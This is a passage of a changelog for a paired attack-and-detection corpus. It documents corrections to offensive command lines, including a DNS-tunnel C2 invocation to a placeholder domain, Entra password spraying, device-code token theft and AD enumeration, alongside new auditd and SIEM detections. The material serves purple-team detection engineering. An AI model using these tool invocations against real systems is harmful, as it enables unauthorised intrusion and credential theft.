# Changelog

All notable changes to **htpx** are documented here.

The format is based on [Keep a Changelog](https://keepachangelog.com/en/1.1.0/),
and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0.html).

htpx is the source of truth for the red↔blue paired corpus; it is vendored into
`dotfiles-Offense` at `offensive/companion/` via `git subtree`. Cutting a release
here (a new top version below) tags the repo and fans the change OUT to
`dotfiles-Offense` as a `companion.lock`-bump PR — see
`.github/workflows/auto-tag.yml` and `.github/workflows/sync-fanout.yml`.

## How releasing works

Add user-visible changes under `[Unreleased]`. To cut a release, move the
`[Unreleased]` entries under a new `## [vX.Y.Z] - YYYY-MM-DD` heading and push to
`main`: `auto-tag.yml` sees the new top version, tags `vX.Y.Z`, and publishes a
GitHub Release; `sync-fanout.yml` then opens the Offense sync PR.

## [v3.0.0] - 2026-08-28

### Added

- **`smb-enum-nxc` is paired — `entries/blue/smb-enum-5145.md`.** The other half of #97,
  kept out of the schema change so it was not held behind new detection content. The
  `pair_note:` said "unpaired pending a detection entry", and this is that entry.

  The detection was never the hard part: `dotfiles-Defense` has carried
  `detections/sigma/discovery/host_enum_srvsvc_wkssvc_5145.yml` for months, and its own
  validation note already named this red entry as the way to reproduce it. The corpus
  simply had nothing to put beside the attack. Ported to SPL, it keys on the `srvsvc` /
  `wkssvc` RPC pipes over `IPC$` — the transport for `NetShareEnum`, `NetSessionEnum` and
  `NetWkstaUserEnum` — and counts **distinct hosts per principal**, because breadth
  across hosts is what separates an enumeration pass from a user browsing a share.

  That pipe set is disjoint from the corpus's two other 5145 detections
  (`coercion-5145` on spoolss/efsrpc/lsarpc/netlogon/lsass; `dpapi-backupkey-5145` on
  protected_storage). Same event ID, different RPC interface, different technique — the
  entry says so explicitly so nobody consolidates the three later.

  `pair_note:` is removed from the red entry rather than reworded: it described a hole
  that no longer exists, and leaving it would be the same defect #98 fixed, pointed the
  other way. `gcp-enum-recon` is now the corpus's only unpaired entry, on its merits.

  (#97)

- **`pair_note:` — a declared hole now has to say why it is a hole.** `pair: null` is a
  legitimate schema value and the pairing gate has always accepted it, correctly. But a
  bare `null` is indistinguishable from an oversight, so the only way to triage one was
  to read the entry's prose and hope the author had left a reason there. That is how
  `gcp-enum-recon` and `smb-enum-nxc` came to be re-triaged every time someone counted
  `entries/red/` against `entries/blue/` and got 103 vs 101.

  Worth being precise about what was actually wrong: **both entries did already state
  their reason**, in prose, and they are the only two in the corpus that do. This was a
  deliberate, consistently-applied decision — not an oversight. What it was not was
  machine-readable, and a directory count cannot read prose. `pair_note:` promotes the
  words that were already written into frontmatter, and CI now rejects an unexplained
  `null`, so the next declared hole cannot be silent.

  - `gcp-enum-recon` — stays unpaired on its merits: its only telemetry is GCP Data
    Access logs, which are off by default and rarely collected, so a blue entry would
    document telemetry most estates do not have.
  - `smb-enum-nxc` — unpaired **pending** a detection entry, and the note says so. This
    one is genuinely detectable (5145 share access, the auth-burst pattern) and
    `dotfiles-Defense` already carries `host_enum_srvsvc_wkssvc_5145.yml`. Authoring the
    blue entry is tracked separately in #97 rather than held behind this schema change.

  (#97)

### Fixed

- **Two red command lines invoked a flag and a binary that do not exist (#101).** Raised by
  the weekly `/corpus-review` routine, and both are the class the command-line dimension was
  added for: a line transcribed from what the tool *ought* to take rather than from what it
  *does*. Nothing in this repo's CI reads a red command line — the pairing graph and slot
  gates are structure, not existence — and neither entry is projected into a flat view, so
  no byte-gate on either side of the fleet had ever read either one.

  - **`valid-accounts-cloud`** — `MSOLSpray` was invoked with `--domain
    <tenant>.onmicrosoft.com`. The tool takes `-u/--userlist`, `-p/--password`, `-o/--out`,
    `-f/--force` and `--url`, and nothing else; argparse rejects the line before a single
    request leaves the box. Nor was there a flag meant instead — the tenant rides in on the
    userlist's UPNs, and `--url`, the one that looks plausible, is FireProx's endpoint, not
    a tenant selector. The argument is simply deleted; the `az login` line below it already
    carries `<tenant>.onmicrosoft.com`, so the entry loses nothing.

  - **`dns-tunnel-c2`** — wrong twice, where the report caught once. `dnscat2-client` is the
    *package*; the binary it puts on PATH is `dnscat` (`Usage: dnscat [args] [domain]`), so
    the line was `command not found`. But the flags described the opposite of the technique:
    inside `--dns`, `server=` is the upstream **resolver** the client sends queries through
    and `domain=` is the delegated zone, so `server=<c2-domain>` put the C2 zone in the
    resolver slot and, with no `domain=` at all, selected dnscat's *direct-connection* mode —
    a session straight to a host, not a tunnel through the DNS hierarchy. That contradicted
    the entry's own prose (an "attacker-controlled authoritative nameserver", beacons
    "encoded into a long subdomain label", "a burst of unique names under one parent zone" is
    delegated-zone mode and nothing else), and it contradicted the `iodine -f -P
    <shared-secret> <c2-domain>` line directly above it, which is the same idea done right.
    Now `dnscat --secret=<key> <c2-domain>`: upstream's own recommended invocation for a
    delegated zone, and the same shape as the iodine line, so the fence teaches one idea
    twice instead of two ideas once. The explicit `--dns domain=<c2-domain>` form is
    identical in effect and was passed over deliberately — it costs two more tokens to get
    wrong in the one entry that got them wrong, and the distinction it would teach now sits
    in the comment, where a reader gets it without being handed a command to demonstrate it.
    The prose is unchanged: it was already right, and it is what convicted the command.

  **The binary rename has a consumer.** `dotfiles-Offense`'s corpus-command gate (its #208)
  resolves the first token of every red command line against `install/corpus-commands.lst`,
  which classifies `dnscat2-client` as `pkg:dnscat2`. That line must become `dnscat` in the
  **same commit** that vendors this corpus: pre-landed it is a stale classification,
  post-landed it is an unresolved command, and the gate exits 2 either way.
  `install/offensive-packages.txt`'s `dnscat2` comment carries the same factual error one
  layer down and should go in the same commit.

- **The README's corpus count had drifted by twelve.** It said "90 paired
  attack/detection concepts", which was exact when it was written — 92 red entries, two
  of them unpaired — and then eleven pairs landed without it. Recomputed from the tree:
  **102 paired, one unpaired.** A count is the cheapest thing to leave stale and the
  first number a reader trusts, which is the same reasoning that put a gate on
  `dotfiles-Defense`'s gate-list counts.

- **`device-code-phish` credited ROADtools for an AADInternals command.** Its
  `source:` read `dirkjanm (ROADtools) & Secureworks CTU` while the only line in the
  fence was `Get-AADIntAccessTokenForMSGraph -UseDeviceCode -SaveToCache` — the
  `Get-AADInt*` prefix is the tell, that is Dr. Nestori Syynimaa's AADInternals, and
  ROADtools contributed nothing to the entry as written. The paired
  `device-code-signin` carried the byte-identical `source:` string and inherited the
  same error; both now credit AADInternals, ROADtools, and Secureworks CTU, and both
  still match each other byte for byte.

  `platform:` was `[windows, cloud]`, which told a Linux operator the technique
  wasn't for them — false. The device-code flow is fully Linux-runnable, so the
  entry now carries `[windows, linux, cloud]` and a `roadtx` line that earns it:
  `roadtx gettokens --device-code -r msgraph`. That invocation was checked against
  upstream rather than transcribed on trust — `gettokens` and `--device-code` are
  real, and `msgraph` is a genuine key in roadlib's `WELLKNOWN_RESOURCES`
  (`https://graph.microsoft.com/`), where the plausible-looking `graph` is **not**.
  Omitting `-c` falls back to roadtx's default Azure CLI client, so the line runs as
  written.

  The two commands share **one** fence, not two. Every one of the 103 red entries
  has exactly one fenced block, and `gen-views.sh`'s `render_red` projects only the
  first (`c == 1`) — a second fence would have silently dropped the Linux line if
  this entry were ever projected. `bloodhound-collect` is the same Windows-plus-Linux
  case and already solves it with a single `sh` fence and `#` headers; this follows
  precedent exactly. `device-code-phish` is not projected into any flat view today,
  so there is no drift to regenerate. (#91)

### Changed

- **`smb-enum-nxc` now carries the whole nxc fold, not a three-line excerpt.** It was
  missing `--loggedon-users` and the `/24` credential spray that
  `dotfiles-Offense`'s `hacktheplanet` has always shown in the same section, so the
  entry was a subset of the flat file it is supposed to be canonical for. With the two
  lines added and the inline comments matched, `gen-views.sh` renders the entry
  byte-identical to those lines — which is what lets Offense wrap them in a
  `companion:gen` marker without losing content. The `/24` form is also the one the new
  paired detection keys on, so omitting it hid the link the pair exists to show.

- **`/corpus-review` now reads red entries' command lines.** Nothing in this repo
  did. All 103 red entries carry a fenced command block, and every gate around them
  is structural or consistency-only — the pairing graph, `{{slot}}` coverage,
  `gen-views.sh --check`, shellcheck. The routine's five dimensions read `attack`,
  `platform`, `pair`, `detection`, and `event_ids`, and never looked inside the
  fence. Four command-line defects shipped across three releases
  (`wmi-subscription`, `ntlm-relay-ntlmrelayx`, `coerce-petitpotam`,
  `bloodhound-collect`) and a human or a downstream routine caught every one.

  The fix is a sixth dimension, not more projection. v2.8.1 already settled that:
  `wmi-subscription` **was** projected into `hacktheplanet` and the byte-gate stayed
  green anyway, because it asserts the flat view matches the entry, not that either
  names a real tool. Projection is orthogonal to this class of bug. The new
  dimension asks whether each binary exists under that exact name (a `Provides:` is
  not a binary), whether it is the *right* one where a project has forked or renamed,
  whether the flags and subcommands are real, whether `platform:` matches what the
  fence runs on, and whether the command's telemetry can produce the signal the
  paired blue entry keys on. Dimension 5's `source:` clause was sharpened in the same
  pass to ask whether provenance credits the toolkit the command actually shows —
  #91 was exactly that defect, and dimension 5 as written did not catch it.

  Two constraints are written in. **Do not guess a name**: the routine has no shell,
  `command -v` and `apt-file` are not available to it and none of these tools are
  installed, so verification is documentation-based via `WebSearch`/`WebFetch` and
  must cite what was checked — v2.8.1 records a review that guessed twice and was
  wrong in the same direction both times. And **deleting can beat correcting**, as
  `wmi-subscription`'s fabricated module showed: substituting the nearest real thing
  would have made the entry describe a different technique. No tool-permission
  changes were needed; `WebSearch`/`WebFetch` were already granted in both
  `corpus-review.md` and `claude-routines.yml`.

  A mechanical tier-1 resolver in *this* repo — binary-exists checking in `ci.yml`
  rather than only downstream in `dotfiles-Offense` — is deliberately still open. It
  needs a package-index source of truth for tools the runner cannot install, which is
  design work rather than an increment. htpx is the source of truth, so a defect
  caught downstream has already shipped. (#93)

- **`asrep-probing-4771` is renamed `asrep-roast-4768`.** The slug named an event the
  entry deliberately does not query. Its `event_ids` has been `[4768]` alone since
  v2.8.2 dropped the secondary `4771 Failure_Code=0x18` arm as a noisier duplicate of
  `password-spray-4625`'s primary; its title already said *4768 no-preauth*; and its
  closing paragraph explicitly disowns `4771`, handing it to that entry. The `4771` was
  a fossil of the v2.4.0 retarget, which changed what the entry detects without changing
  what it is called. Every sibling in the Kerberos set — `kerberoasting-4769`,
  `dcsync-4662`, `golden-ticket-4769`, `password-spray-4625` — is
  `<technique>-<primary event>` and means it; this was the only one whose suffix named
  an event it excludes.

  **`asrep-roast`, not `asrep-probing`.** "Probing" *is* the `4771` enumeration concept
  this entry rejects — the entry is about the roast, which succeeds and therefore never
  emits a `4771` failure at all. `dotfiles-Defense` arrived at the same word
  independently when it named its rule `asrep_roast_4768.yml`, which is the best
  available evidence for what a second reader calls this.

  **An entry `id` is a public surface, so this is a breaking change** — the next release
  cutting it is a **major** bump, per the rule in `.claude/commands/release-readiness.md`.
  Consumers cite entries by id and by path: `dotfiles-Offense` wraps this one in a
  `companion:gen` marker in `PURPLE-TEAM.md`, and `dotfiles-Defense` cites its file URL
  from two Sigma rules and a generated coverage row. Neither is reachable from this
  repo's gates — `ci.yml` verifies the pairing graph, and nothing here can see a
  downstream marker or citation.

  **The fan-out is ordering-sensitive and must be done by hand before the release.**
  `sync-fanout.yml` runs Offense's `gen-views.sh` before it commits, and that script
  hard-fails (exit 2, in both `--check` and bare mode) on a marker naming an id with no
  entry — so a release cut before Offense's markers are updated aborts the sync with no
  PR, *after* `auto-tag.yml` has already published the tag and Release. The reverse
  order reddens Offense's own drift gate. Both consumers are sha-pinned, so the window
  between this commit and that fix is safe; it just needs to be short. (#103)

  The v2.8.2 and v2.4.0 notes below keep the old name: they are history, and were true
  when written. This bullet is the forward pointer.

## [v2.10.1] - 2026-08-22

### Fixed

- **`bloodhound-collect` now invokes the CE collector.** The Linux line ran
  `bloodhound-python`, the binary from the legacy `bloodhound.py` package
  (≤4.3.1), whose zips **do not ingest into BloodHound CE** — an operator could
  clip the command, collect a full domain graph, and only then have CE reject the
  archive. Swapped to `bloodhound-ce-python` (apt `bloodhound-ce-python`, pipx
  `bloodhound-ce`); same fork, same `-u/-p/-d/-dc/-c` flags, so this is a name
  swap and not a flag rewrite. The entry now also states plainly that the legacy
  collector exists and is not CE-compatible, for anyone who already has it
  installed and would otherwise wonder why ingest fails. The `SharpHound.exe`
  line and the paired blue entry `bloodhound-collect-4662` are unaffected — the
  `4662`/`1644` telemetry is identical either way. (#89)

## [v2.10.0] - 2026-08-21

### Added

- **AD Discovery — the enumeration that precedes every AD attack in the corpus.** Two new
  red↔blue pairs (#78) closing the discovery gap: the corpus had deep AD *offense*
  (Kerberoasting, DCSync, RBCD, shadow credentials, ADCS) but no detection for the
  reconnaissance that comes first. ATT&CK tags (`T1087.002`, `T1069.002`, `T1482`, all
  Discovery / TA0007) verified against live MITRE.

  - **`bloodhound-collect` / `bloodhound-collect-4662`** — the SharpHound /
    `bloodhound-python` graph pull. Collection has no single-event signature (every read
    is legitimate LDAP), so the blue keys on the *shape* — a `4662` directory-access
    burst, one account against many distinct objects (`dc(Object_Name)`) in a window. Two
    honesty notes carried in the entry: `4662` needs the Directory Service Access
    subcategory **and** a SACL on the naming context or the DC emits nothing, and the
    `0x100` mask is shared with `dcsync-4662` — same event, opposite shape (fan-out vs. a
    replication right on a few objects).
  - **`ldap-recon` / `ldap-recon-4662`** — the hand-tool version (`ldapsearch`,
    `Get-ADUser`, `nxc ldap`). Different shape from the sweep: a few *broad, revealing
    filters* rather than a fan-out, so the primary arm is `1644` matching the tell-tale
    filter attributes (`servicePrincipalName`, the `userAccountControl` bitfield,
    `adminCount`), with a `4662` property-GUID fallback where `1644` is off.

  Both entries state the **`1644`** prerequisite plainly — the expensive/inefficient-LDAP
  event is off by default and needs DC diagnostics registry thresholds — rather than
  presenting an arm the tenant may not have as if it always fires.

- **Initial Access — phishing and valid accounts, the front door the corpus never
  mapped.** Two new red↔blue pairs (#79). Initial Access had been supply-chain-only
  (`T1195.002`); this adds the two most common intrusion entry points, both with a real
  Entra sign-in invariant rather than a generic "look for a bad login." ATT&CK tags
  verified against live MITRE.

  - **`aitm-phish` / `aitm-phish-signin`** — `T1566.002`. Adversary-in-the-middle
    (Evilginx) phishing that beats MFA by stealing the *session cookie*. The detection
    keys on the AiTM-specific tell — **token replay across ASNs**: interactive auth from
    the proxy's network, then non-interactive token use from the attacker's, correlated
    in `SigninLogs` × `AADNonInteractiveUserSignInLogs`. Names Entra ID Protection's
    `anomalousToken` risk as the maintained arm where P2 exists.
  - **`valid-accounts-cloud` / `valid-accounts-signin`** — `T1078.004`. Credential
    stuffing into a tenant sign-in. Two arms: the failure-burst-then-success shape (the
    winning-side inverse of `password-spray-4625`), and a first-seen-ASN arm built on a
    per-user baseline (the same own-history join `vault-secret-read-audit` uses).

  **`T1190` (exploit-public-facing-application) was deliberately left out**, per #79's own
  guidance: its detection is app/CVE-specific and a generic version would be the
  no-discriminator defect the whole review targeted. Phishing and valid-accounts are the
  two #79 flagged as having concrete invariants; both closed here.

## [v2.9.0] - 2026-08-21

### Added

- **Linux endpoint persistence — the corpus's first Linux tradecraft beyond the lone
  cryptomining pair.** Three new red↔blue pairs (#77), each an on-host persistence
  technique against its auditd detection. ATT&CK tags verified against live MITRE. The
  blue halves establish the Linux detection idiom the corpus did not yet have: auditd
  `-w` path watches (which alert nothing until loaded, so each entry ships its rules),
  and a single discriminator across all three — the *writing process*, since a package
  manager touching these paths is baseline and a shell or interpreter touching them is
  the finding.

  - **`cron-persist` / `cron-persist-auditd`** — `T1053.003`. Watches the cron
    drop-directories (`/etc/cron.d/`, the `cron.{hourly,daily,weekly,monthly}` dirs,
    `/var/spool/cron/`) rather than the `crontab` binary, since a file dropped into
    `/etc/cron.d/` never invokes it.
  - **`systemd-persist` / `systemd-persist-auditd`** — `T1543.002`. Watches the system
    unit dirs for a new `.service`/`.timer`, and calls out the per-user
    `~/.config/systemd/user/` tree an unprivileged implant uses without touching a
    root-owned path.
  - **`ssh-authkeys-persist` / `ssh-authkeys-auditd`** — `T1098.004`. The write *is* the
    detection (there is no process to catch); covers root and service accounts by name,
    `/home` by directory watch, and the `AuthorizedKeysCommand` `sshd_config` variant
    that never touches an `authorized_keys` file.

- **Linux privilege escalation — sudo and SUID abuse.** Two more red↔blue pairs (#77),
  the privesc tranche following the persistence one above, on the same auditd idiom.
  ATT&CK tags verified against live MITRE. Both blue halves share one invariant that
  generalizes past any single GTFOBins vehicle: auditd preserves the **loginuid (`auid`)**
  across a privilege transition, so a root shell (`euid=0`) whose `auid` is still a real
  login user is the fingerprint of an escalation — sudo and SUID alike — captured once as
  the `priv_exec` rule and reused by both.

  - **`sudo-abuse-privesc` / `sudo-abuse-auditd`** — `T1548.003`. Keys on the
    loginuid-vs-euid gap rather than the allowed binary, plus a `/etc/sudoers` /
    `/etc/sudoers.d/` watch that catches the misconfiguration being *planted* before it
    is abused.
  - **`suid-abuse-privesc` / `suid-abuse-auditd`** — `T1548.001`. Adds a `chmod`/`fchmodat`
    setuid-bit watch for the planted-SUID path, kept deliberately broad (auditd cannot
    cheaply filter to only the setuid bit) with the triage narrowing to `04000` on a
    shell or a file outside the baseline SUID set — the same broad-catch, narrow-in-query
    shape the persistence watches use.

- **Linux credential access — /etc/shadow and SSH private keys.** The final #77 tranche,
  which closes the issue: Linux endpoint coverage goes from one entry to eight, spanning
  persistence, privilege escalation, and credential access. ATT&CK tags verified against
  live MITRE. The idiom shifts from watching writes to watching **reads** — auditd
  captures a read only when the watch is set with `-p r` — with the reading process (and
  the `auid` behind it) as the discriminator, the read-side mirror of the earlier
  tranches' writing-process key.

  - **`shadow-dump-credaccess` / `shadow-dump-auditd`** — `T1003.008`. A read watch on
    `/etc/shadow` is naturally high-fidelity because almost nothing should read it; the
    query allowlists the auth stack and account tools and surfaces any other reader
    (`cat`, `cp`, `unshadow`, a `/tmp` binary).
  - **`ssh-key-theft-credaccess` / `ssh-key-theft-auditd`** — `T1552.004`. Harder,
    because a private key is read on every outbound SSH; the query leans on the theft
    *shape* — one process, one `auid`, keys read across **many** users' `.ssh` dirs
    (`dc(home) > 1`) — with the non-`ssh`/`git` reader allowlist as the weaker
    single-key arm.

## [v2.8.2] - 2026-08-21

### Fixed

- **Four detections could not see what their own prose promised.** From the weekly
  corpus review (#70). No ATT&CK tags changed — the tagging was checked against live
  MITRE and is correct and v19-current, including the `TA0112` / `T1685` / `T1686.001`
  entries that look wrong against pre-v19 memory. These are query-fidelity fixes, and
  three of the four share one root cause: the real discriminator lived in the prose
  while the query gated on something narrower.

  - **`gcp-iam-policy-audit`** — the body calls an `allUsers`/`allAuthenticatedUsers`
    binding "an immediate, standalone finding," but the filter had no member clause at
    all; its only discriminator was a three-role allowlist, so a public grant of
    `roles/viewer`, any service `*.admin`, or a custom role fired nothing — including
    the `allUsers` binding its own paired attack performs. The member test is now an
    independent branch of an OR, and the role branch matches `[aA]dmin$` rather than a
    fixed list. Adds the repeated-field triage caveat: `bindingDeltas` clauses can be
    satisfied by different array elements of one `SetIamPolicy` call.

  - **`pypi-publish-audit`** — gated on `NOT publisher_type=trusted_publisher`, wrong
    twice. It excludes on an actor *class* the attacker shares (the paired attack
    uploads with a *stolen* token), which the sibling `npm-publish-audit` forbids
    verbatim: "Allowlist the identity, never the actor class." And `publisher_type` is
    not a field the PyPI journal emits, so in Splunk the negation was vacuously true
    and the search was silently "every release ever published," OIDC ones included.
    Now mirrors npm: pin `submitted_by`, table the journal's real fields, keep
    trusted-publishing provenance as a triage column.

  - **`vault-secret-read-audit`** — promised breadth "in a short window" plus a
    per-token baseline and a new-source-IP arm, and implemented none of them: one
    unbucketed `dc(request.path) > 25` aggregating over the whole search range. Now
    buckets on `bin _time span=5m` and floors on the token's own baseline; adds the
    interactive-token arm as a second query (`userpass-`/`oidc-`/`ldap-` prefixes on
    `auth.display_name`), and documents the known-source-IP lookup that catches the
    low-and-slow sweep both thresholds miss.

  - **`reverse-tunnel-detect`** — required >1 MB in *both* directions over 30 minutes,
    which excludes by construction the asymmetric, bursty pivot traffic its paired
    `chisel R:socks` / `ligolo-ng` entry describes as "disproportionate." Now gates on
    duration plus volume in either direction, ranks by orig/resp ratio, and covers the
    redial case (repeated short sessions to one rare destination) that any duration
    floor invites. JA4/JA4S promoted over JA3.

  Findings 5–8 of #70 are addressed in the entry below; its three coverage holes are
  split into #77 (Linux endpoint), #78 (AD discovery) and #79 (initial access).

- **Five more detections gated on the wrong thing — and two entries advertised telemetry
  the paired half never emits.** Findings 5–8 of the same review (#76), carried over when
  #75 closed only the HIGH-confidence four. No ATT&CK tags changed here either. Finding 5
  is the same root cause as above, four more times: the real discriminator lived in the
  entry's prose while the query gated on something narrower, or on nothing at all.

  - **`entra-role-assign-audit`** — a four-role `has_any` allowlist against a technique
    whose selling point is blending into role churn. Global Administrator, Privileged Role
    Administrator, Privileged Authentication Administrator and Application Administrator
    were the only roles that fired, so an attacker taking User Administrator, Groups
    Administrator, Cloud Application Administrator or Hybrid Identity Administrator — each
    a path back to Global Admin — was invisible. The allowlist is gone: every
    `Add member to role` / `Add eligible member to role` now alerts, ranked by a
    sensitivity `tier`, with Entra's `isPrivileged` role property named as the maintained
    source for the tiers.

  - **`cf-worker-deploy-audit`** — the body said Worker deploys should come from CI and a
    human/out-of-pipeline actor is the tell; the query had no actor clause, making it a
    catch-all on routine deploys. Now pins the release identity the way `npm-publish-audit`
    does, with the `api`/`dash` initiation context and actor type as triage columns — and
    restates why the context cannot be the gate: the paired attack deploys with a *stolen*
    API token, so it shares the pipeline's actor class.

  - **`cf-waf-disable-audit`** — the body identified `enabled:true→false` as "the quieter
    way to open the edge," and the query matched every `update` on the ruleset, so the
    discriminator never reached it. Split into a `delete` arm that always alerts and an
    `update` arm that tests the recorded new value, plus the same identity allowlist. Adds
    the version caveat that makes the difference between a detection and a silent no-op:
    before/after values are an **Audit Logs v1** feature and Cloudflare's **v2** logs do not
    carry them yet, so the entry now says which arm needs which and what the v2 fallback is.

  - **`lateral-4624-fanout`** — sold as the pass-the-hash detection but implemented as
    generic `4624` type-3 with `dc(host) > 2`, which is ordinary network-logon fan-out and
    noisy at that floor. PtH *is* an NTLM authentication, so the primary arm now requires
    `Authentication_Package="NTLM"` / `Logon_Process="NtLmSsp"` at a higher host floor; the
    package-agnostic sweep is kept as an explicit hunt arm so overpass-the-hash and mixed
    package fan-out are not lost.

  - **`okta-api-token-audit` and `okta-api-token`** — the blue half matched only
    `system.api_token.create` while the red half explicitly recommends the OAuth service-app
    + private-key-JWT route, which never writes that event. The red half also asserted
    "Either path writes `system.api_token.create`," which is false. Both corrected against
    Okta's event-type catalog: the query now covers
    `app.oauth2.credentials.lifecycle.create`/`.activate` (a client secret **or a JWK** added
    to a client — the literal act of planting the backdoor),
    `app.oauth2.client.privilege.grant` (API scopes to an OAuth client; the highest-signal
    event of the set, with no static-token analogue),
    `app.oauth2.client.lifecycle.create`/`.update`, and
    `app.oauth2.client.read_client_secret`, tabling `eventType` so the two persistence shapes
    stay distinguishable at triage.

  - **`gws-mail-forward-audit`** — tabled `forwarding_email`, which Google does not emit;
    the documented parameter is `email_forwarding_destination_address`, so the alert fired
    with an empty destination column — the one field triage needs. Adds the admin-side
    `CHANGE_APPLICATION_SETTING` arm for the org-wide Gmail policy flip, points at mailbox
    delegation and forwarding filters as the same-intent channels, and states plainly that
    whether the paired attack's **Gmail API** path emits `email_forwarding_out_of_domain` is
    undocumented and must be verified per tenant.

  - **`mtls-c2-sliver` and `mtls-c2-ja3`** — the red half claimed the JA3 "doesn't change
    across sleep/jitter," overstating it into a protocol invariant; Go implants shift their
    ClientHello between releases and operators front with uTLS. Both halves now treat JA3 as
    a build-era IOC with a shelf life, and foreground the invariant neither stated: mutual
    TLS is *mutual*, so the implant must present a **client certificate**, and outbound
    client-cert TLS to a destination outside the enterprise PKI is rare without any
    fingerprint list. That is the blue entry's new primary arm; JA4/JA4S lead the
    fingerprint arm behind it.

  - **`domain-fronting-cdn` and `domain-fronting-sni-mismatch`** — currency notes on both
    halves; the pair is kept. Classic fronting is deprecated on the very CDNs the red entry
    names (CloudFront, Google, Azure, Fastly; roughly 2018–2021), the SNI≠Host invariant
    needs break-and-inspect that the technique's pinned CDN TLS defeats, and **ECH** voids
    the mismatch outright. The blue entry's non-decryption arm — a non-browser process
    reaching a CDN edge — is promoted from afterthought to primary, since none of the three
    touches it.

  - **`asrep-probing-4771`** — its secondary `4771 Failure_Code=0x18` query duplicated
    `password-spray-4625`'s **primary** arm at a lower threshold (`> 5` against `> 10`),
    making it strictly the noisier twin of another entry's finding. Dropped in favour of a
    cross-reference; the entry keeps the `4768 Pre_Authentication_Type=0` arm that is AS-REP
    roast's real invariant. Retitled, and `4771` removed from its `event_ids`.

  Two of the review's own claims did not survive checking and were **not** actioned, which
  is recorded here rather than silently skipped. `gws-mail-forward-audit`'s sourcetype is
  correct — `email_forwarding_out_of_domain` is documented as a `user_accounts` activity
  alongside `2sv_enroll`, not a Gmail-application event — so it is unchanged. And the review
  attributed the okta telemetry error to the blue half when the false claim was in the red
  half; both were fixed.

## [v2.8.1] - 2026-08-20

### Fixed

- **`wmi-subscription` shipped an nxc module that does not exist.** Its first line was
  `nxc smb {{rhost}} … -M wmi-event -o CONSUMER=…`. There is no such module, in either
  spelling: checked against netexec 1.5.1, neither the 126 modules in `nxc smb -L` nor the
  shorter `nxc wmi -L` list contains `wmi-event` or `wmi_event`. This was not the usual
  hyphen-vs-underscore drift that the rest of the corpus' module names (`gpp_password`,
  `lsassy`, `schtask_as`) would suggest — the whole invocation was fabricated, `-o
  CONSUMER=` included.

  It is **deleted rather than corrected**, because NetExec has no equivalent. Its one
  T1546.003 surface is `nxc wmi <t> --exec-method wmiexec-event`, and that is an
  *execution* method — it drives a subscription and tears it down — not the reboot-surviving
  permanent consumer this entry is about. Substituting it would have kept the line running
  at the cost of making the entry describe something else. The body now says so explicitly,
  so the next reader does not "restore" a plausible-looking module. PowerLurk's
  `Register-MaliciousWmiEvent`, which does do what the prose describes, is untouched — as is
  the `__FilterToConsumerBinding` pedagogy the paired detection (`wmi-subscription-sysmon`)
  keys on.

- **`ntlm-relay-ntlmrelayx` invoked `proxychains`, which is not a binary.** The apt package
  is `proxychains4` and it ships only `/usr/bin/proxychains4`; its `Provides: proxychains`
  is a *virtual package* relation, so no file by that name lands on the box and
  `apt-file search '/usr/bin/proxychains$'` matches nothing. `clip` the entry, paste, and
  the relay ride dies with `command not found` at the moment the SOCKS session is parked.
  Now `proxychains4`, in both the command and the prose.

Unlike `coerce-petitpotam` in v2.8.0, `wmi-subscription` **is** projected into
`dotfiles-Offense`'s `hacktheplanet`, so its `companion.yml` byte-gate did compare the two
— and stayed green, because the gate asserts the flat view matches the entry, not that
either names a real tool. A projected entry is no safer than an unprojected one against
this class of bug; only running the tool is.

Both were found while acting on dotfiles-Offense's `/methodology-review` routine
(dotgibson/dotfiles-Offense#187). That report guessed the module was a `wmi_event`
underscore typo and called the `proxychains` name "probably fine … one `command -v` settles
it" — the command was run, and both guesses were wrong in the same direction: worse.

## [v2.8.0] - 2026-08-20

### Changed

- **The release fan-out targets `dotfiles-Offense`, not `dotfiles-Kali`.** That repo was
  renamed when it stopped being an OS layer, and `sync-fanout.yml` had not followed. The
  breakage would have been **silent**: this workflow opens a PR rather than merging, so a
  fan-out that never runs reddens nothing anywhere. The line that actually breaks is the
  App-token mint — `repositories:` scopes an installation token **by repository name**,
  and App installation scopes do not reliably follow a repo redirect — with the clone URL
  and the three `gh pr` calls behind it. The `$kali` shell variable is renamed with them
  in the same pass; under `set -euo pipefail` a half-rename is an unbound-variable abort,
  not a cosmetic miss. Prose across `auto-tag.{yml,sh}`, `README.md`, `gen-views.sh` and
  the two `.claude/commands` follows. Entries below this heading keep the old name: they
  are history, and were true when written.

- **ATT&CK v19 retag — 10 pairs move off revoked or drifted tags** (#65). The
  v19 release (14 April 2026) split Defense Evasion into **Stealth** (`TA0005`,
  renamed) and **Defense Impairment** (`TA0112`, new), and reorganized "Impair
  Defenses" — promoting `T1562.001` to a parent technique and **formally
  revoking** the sub-techniques this corpus used. Unlike the `T1496` →
  `T1496.001` move in v2.7.0, this is a correction rather than a sharpening: the
  old IDs no longer resolve. `attack.mitre.org` now serves a revocation redirect
  for each, which is what these retags follow:
  - `T1562.008` → **`T1685.002`** (Disable or Modify Cloud Log) —
    `gcp-audit-log-disable` ↔ `gcp-audit-log-tamper-audit`.
  - `T1562.007` → **`T1686.001`** (Cloud Firewall) — `snowflake-network-policy`
    ↔ `snowflake-network-policy-audit`.
  - `T1562.001` → **`T1685`** (Disable or Modify Tools, now a parent) —
    `npm-2fa-disable`, `slack-2fa-disable`, `gh-branch-protection-off`,
    `gl-protected-branch-off`, `vault-audit-disable` (+ mates). Disabling an MFA
    requirement, a branch-protection rule, or an audit device are all
    "disrupting preventative, detection, and response mechanisms," which is the
    parent's scope; none of the new subs fits them more closely.
  - `cf-waf-disable` ↔ `cf-waf-disable-audit` takes **`T1686.001`** rather than
    the `T1685` base its old tag redirects to. Deleting a Cloudflare firewall
    rule to expose the origin is the same shape as opening a Snowflake IP
    allowlist, and the two would otherwise end up tagged differently.
  - All of the above also move `TA0005` → **`TA0112`**, since `T1685`/`T1686`
    sit under the new Defense Impairment tactic.
- **Two further v19 drift items**, found by sweeping every technique ID in
  `entries/` against live ATT&CK rather than only the IDs named in the review:
  - `dcshadow` ↔ `dcshadow-4742` — `T1207` is not revoked, but it now sits under
    Defense Impairment, so the pair moves `TA0005` → `TA0112`.
  - `harbor-artifact-delete` — `T1070` and `TA0005` are both still correct, but
    the tactic's *name* changed, so its `phase:` label becomes `Stealth`.

  The sweep found no other revoked IDs and no other tactic drift.

### Fixed

- **`coerce-petitpotam` shipped two commands that do not exist.** Its first line was
  `impacket-petitpotam {{lhost}} {{rhost}}` — no such tool: PetitPotam is
  `topotam/PetitPotam`, it is not one of impacket-scripts' ~60 scripts, and Kali packages
